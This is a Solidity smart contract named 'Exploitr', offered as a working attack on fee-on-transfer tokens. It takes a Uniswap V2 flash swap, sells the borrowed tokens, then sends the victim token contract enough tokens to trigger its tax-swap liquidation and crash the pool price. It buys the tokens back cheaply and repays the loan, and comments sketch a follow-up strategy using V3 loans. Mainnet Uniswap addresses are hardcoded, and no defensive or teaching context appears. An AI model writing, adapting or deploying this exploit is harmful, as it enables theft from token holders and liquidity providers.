// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external;
}

contract Exploitr is IUniswapV2Callee {
    address private constant UNISWAP_V2_FACTORY =
        0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant UNISWAP_V2_ROUTER =
        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant UNISWAP_V3_FACTORY =
        0x1F98431c8aD98523631AE4a59f267346ea31F984;

    IUniswapV2Factory private constant _factory =
        IUniswapV2Factory(UNISWAP_V2_FACTORY);
    IUniswapV3Factory private constant _factoryv3 =
        IUniswapV3Factory(UNISWAP_V3_FACTORY);
    IUniswapV2Router02 private constant _router =
        IUniswapV2Router02(UNISWAP_V2_ROUTER);

    VictimInterface private _victim;
    uint256 _overflowAmount = 0;

    function goGoPowerRangers(address victimAddress) external {
        _victim = VictimInterface(victimAddress);

        uint256 contractBalance = _victim.balanceOf(address(_victim));
        uint256 threshold = _victim._taxSwapThreshold();
        _overflowAmount = (threshold - contractBalance);

        IUniswapV2Pair pair = IUniswapV2Pair(
            _factory.getPair(address(_victim), _router.WETH())
        );

        // Flash loan how much? Let's do 10% of contract balance for now. + overflow
        uint arbitragePot = contractBalance / 10;
        bytes memory data = abi.encodePacked(uint(1)); // enable flash
        pair.swap(_overflowAmount + arbitragePot, 0, address(this), data);

        // Send remaining ETH to myself
    }

    // Flash callback
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint /*amount1*/,
        bytes calldata /*data*/
    ) external {
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        address pair = _factory.getPair(token0, token1);
        assert(msg.sender == pair);
        assert(sender == address(this));

        // about 0.3% fee, +1 to round up
        uint fee = (amount0 * 3) / 997 + 1;
        uint amountToRepay = amount0 + fee;

        // Sell tokens for ETH
        address[] memory path = new address[](2);
        path[0] = address(_victim);
        path[1] = _router.WETH();
        uint arbPot = amount0 - _overflowAmount;
        uint deadline = block.timestamp + 150;
        _victim.approve(address(_router), _victim.balanceOf(address(this)));
        _router.swapExactTokensForETH(arbPot, 0, path, address(this), deadline);

        // Force liquidation
        _victim.transfer(address(_victim), _overflowAmount);

        // Buy back tokens
        _router.swapETHForExactTokens(
            amountToRepay,
            path,
            address(this),
            deadline
        );

        // Repay
        _victim.transfer(address(pair), amountToRepay);

        // NEW STRATEGY
        // get a loan of X+Y tokens from V3 - LOCKED
        //      sell Y tokens on V2 for ETH
        //      cause liquidation on V2 with X
        //      V2 pool price now low
        //      buy Y tokens on V2
        // replay loan on V3
    }
}

interface IUniswapV2Pair {
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;

    function token0() external view returns (address);

    function token1() external view returns (address);
}

interface IUniswapV2Factory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

interface VictimInterface is IERC20 {
    function _taxSwapThreshold() external returns (uint256);
}

interface IUniswapV2Router01 {
    function swapExactTokensForETH(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function WETH() external pure returns (address);

    function swapETHForExactTokens(
        uint amountOut,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);
}

interface IUniswapV3Pool {
    /// @notice Receive token0 and/or token1 and pay it back, plus a fee, in the callback
    /// @dev The caller of this method receives a callback in the form of IUniswapV3FlashCallback#uniswapV3FlashCallback
    /// @dev Can be used to donate underlying tokens pro-rata to currently in-range liquidity providers by calling
    /// with 0 amount{0,1} and sending the donation amount(s) from the callback
    /// @param recipient The address which will receive the token0 and token1 amounts
    /// @param amount0 The amount of token0 to send
    /// @param amount1 The amount of token1 to send
    /// @param data Any data to be passed through to the callback
    function flash(
        address recipient,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

interface IUniswapV2Router02 is IUniswapV2Router01 {}

interface IUniswapV3Factory {
    /// @notice Returns the pool address for a given pair of tokens and a fee, or address 0 if it does not exist
    /// @dev tokenA and tokenB may be passed in either token0/token1 or token1/token0 order
    /// @param tokenA The contract address of either token0 or token1
    /// @param tokenB The contract address of the other token
    /// @param fee The fee collected upon every swap in the pool, denominated in hundredths of a bip
    /// @return pool The pool address
    function getPool(
        address tokenA,
        address tokenB,
        uint24 fee
    ) external view returns (address pool);
}
